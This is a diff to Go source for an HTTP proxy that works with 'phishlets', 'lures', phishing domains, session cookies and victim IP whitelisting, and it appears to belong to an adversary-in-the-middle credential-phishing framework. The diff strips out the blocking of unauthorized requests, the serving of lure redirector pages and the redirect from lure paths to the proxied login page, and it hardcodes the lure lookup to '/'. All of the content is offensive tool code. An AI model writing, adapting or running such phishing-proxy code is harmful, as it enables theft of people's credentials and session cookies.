@@ -18,12 +18,10 @@ import (
 	"encoding/json"
 	"fmt"
 	"html"
-	"io"
 	"io/ioutil"
 	"net"
 	"net/http"
 	"net/url"
-	"os"
 	"path/filepath"
 	"regexp"
 	"sort"
@@ -178,7 +176,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
 			o_host := req.Host
-			lure_url := req_url
 			req_path := req.URL.Path
 			if req.URL.RawQuery != "" {
 				req_url += "?" + req.URL.RawQuery
@@ -271,10 +268,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				session_cookie := getSessionCookieName(pl_name, p.cookieName)
 
 				ps.PhishDomain = phishDomain
-				req_ok := false
 				// handle session
 				if p.handleSession(req.Host) && pl != nil {
-					l, err := p.cfg.GetLureByPath(pl_name, req_path)
+					l, err := p.cfg.GetLureByPath(pl_name, "/")
 					if err == nil {
 						log.Debug("triggered lure for path '%s'", req_path)
 					}
@@ -300,7 +296,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							// TODO: allow only retrieval of static content, without setting session ID
 
 							create_session = false
-							req_ok = true
 							/*
 								ps.SessionId, ok = p.getSessionIdByIP(remote_addr, req.Host)
 								if ok {
@@ -379,8 +374,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									ps.Created = true
 									ps.Index = sid
 									p.whitelistIP(remote_addr, ps.SessionId, pl.Name)
-
-									req_ok = true
 								}
 							} else {
 								log.Warning("[%s] unauthorized request: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
@@ -403,133 +396,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				// redirect for unauthorized requests
-				if ps.SessionId == "" && p.handleSession(req.Host) {
-					if !req_ok {
-						return p.blockRequest(req)
-					}
-				}
-				req.Header.Set(p.getHomeDir(), o_host)
+				// do not redirect for unauthorized requests
 
-				if ps.SessionId != "" {
-					if s, ok := p.sessions[ps.SessionId]; ok {
-						l, err := p.cfg.GetLureByPath(pl_name, req_path)
-						if err == nil {
-							// show html redirector if it is set for the current lure
-							if l.Redirector != "" {
-								if !p.isForwarderUrl(req.URL) {
-									if s.RedirectorName == "" {
-										s.RedirectorName = l.Redirector
-										s.LureDirPath = req_path
-									}
-
-									t_dir := l.Redirector
-									if !filepath.IsAbs(t_dir) {
-										redirectors_dir := p.cfg.GetRedirectorsDir()
-										t_dir = filepath.Join(redirectors_dir, t_dir)
-									}
-
-									index_path1 := filepath.Join(t_dir, "index.html")
-									index_path2 := filepath.Join(t_dir, "index.htm")
-									index_found := ""
-									if _, err := os.Stat(index_path1); !os.IsNotExist(err) {
-										index_found = index_path1
-									} else if _, err := os.Stat(index_path2); !os.IsNotExist(err) {
-										index_found = index_path2
-									}
-
-									if _, err := os.Stat(index_found); !os.IsNotExist(err) {
-										html, err := ioutil.ReadFile(index_found)
-										if err == nil {
-
-											html = p.injectOgHeaders(l, html)
-
-											body := string(html)
-											body = p.replaceHtmlParams(body, lure_url, &s.Params)
-
-											resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
-											if resp != nil {
-												return req, resp
-											} else {
-												log.Error("lure: failed to create html redirector response")
-											}
-										} else {
-											log.Error("lure: failed to read redirector file: %s", err)
-										}
-
-									} else {
-										log.Error("lure: redirector file does not exist: %s", index_found)
-									}
-								}
-							}
-						} else if s.RedirectorName != "" {
-							// session has already triggered a lure redirector - see if there are any files requested by the redirector
-
-							rel_parts := []string{}
-							req_path_parts := strings.Split(req_path, "/")
-							lure_path_parts := strings.Split(s.LureDirPath, "/")
-
-							for n, dname := range req_path_parts {
-								if len(dname) > 0 {
-									path_add := true
-									if n < len(lure_path_parts) {
-										//log.Debug("[%d] %s <=> %s", n, lure_path_parts[n], req_path_parts[n])
-										if req_path_parts[n] == lure_path_parts[n] {
-											path_add = false
-										}
-									}
-									if path_add {
-										rel_parts = append(rel_parts, req_path_parts[n])
-									}
-								}
-
-							}
-							rel_path := filepath.Join(rel_parts...)
-							//log.Debug("rel_path: %s", rel_path)
-
-							t_dir := s.RedirectorName
-							if !filepath.IsAbs(t_dir) {
-								redirectors_dir := p.cfg.GetRedirectorsDir()
-								t_dir = filepath.Join(redirectors_dir, t_dir)
-							}
-
-							path := filepath.Join(t_dir, rel_path)
-							if _, err := os.Stat(path); !os.IsNotExist(err) {
-								fdata, err := ioutil.ReadFile(path)
-								if err == nil {
-									//log.Debug("ext: %s", filepath.Ext(req_path))
-									mime_type := getContentType(req_path, fdata)
-									//log.Debug("mime_type: %s", mime_type)
-									resp := goproxy.NewResponse(req, mime_type, http.StatusOK, "")
-									if resp != nil {
-										resp.Body = io.NopCloser(bytes.NewReader(fdata))
-										return req, resp
-									} else {
-										log.Error("lure: failed to create redirector data file response")
-									}
-								} else {
-									log.Error("lure: failed to read redirector data file: %s", err)
-								}
-							} else {
-								//log.Warning("lure: template file does not exist: %s", path)
-							}
-						}
-					}
-				}
-
-				// redirect to login page if triggered lure path
-				if pl != nil {
-					_, err := p.cfg.GetLureByPath(pl_name, req_path)
-					if err == nil {
-						// redirect from lure path to login url
-						rurl := pl.GetLoginUrl()
-						resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
-						if resp != nil {
-							resp.Header.Add("Location", rurl)
-							return req, resp
-						}
-					}
-				}
+				// do not redirect to login page if triggered lure path
 
 				// check if lure hostname was triggered - by now all of the lure hostname handling should be done, so we can bail out
 				if p.cfg.IsLureHostnameValid(req.Host) {
